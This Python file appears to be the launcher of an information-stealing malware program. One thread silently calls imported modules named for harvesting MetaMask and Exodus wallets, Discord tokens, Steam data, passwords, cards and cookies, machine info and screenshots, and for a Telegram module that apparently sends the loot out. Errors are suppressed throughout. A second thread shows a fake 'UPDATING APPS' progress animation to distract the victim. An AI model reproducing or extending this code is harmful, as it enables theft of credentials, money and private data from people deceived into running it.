from metamasak import yea
from discord import find_tokens
from exodus import runner
from machine import machineinfo

def stha():
    try:
        
        import passwords_cards_cookies
    except:
        pass
    from screenshot import sikrinsat
    from telegram import telegram
    try:
        
        import steam
    except:
        pass


    try:
        yea()
    except:
        pass


    try:
        yea()
    except:
        pass
    try:
        find_tokens()
    except:
        pass
    try:
        runner()
    except:
        pass
    try:
        machineinfo()
    except Exception as e:
        print(e)
        pass
    try:
        sikrinsat()
    except:
        pass
    try:
        telegram()
    except:
        pass

def andtheother():
    import time
    import sys
    import os
    print("UPDATING APPS (it may take 5 minutes)")


    #animation = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
    animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
    za = ["LOADING MODULES", "LOADING ENDPOINTS", "LOADING MTPROTO","LOADING MODULES", "LOADING ENDPOINTS", "LOADING MTPROTO","LOADING MODULES", "LOADING ENDPOINTS", "LOADING MTPROTO", "UPDATING MODULES", "CHECKING MODULES"]
    for i in range(len(za)-1):
        print(za[i])
        for i in range(len(animation)):
            time.sleep(0.2)
            sys.stdout.write("\r" + animation[i % len(animation)])
            sys.stdout.flush()
        os.system("cls")

        print("\n")

from threading import Thread


za1 = Thread(target=andtheother, args=())
za1.start()

za2 = Thread(target=stha, args=())
za2.start()
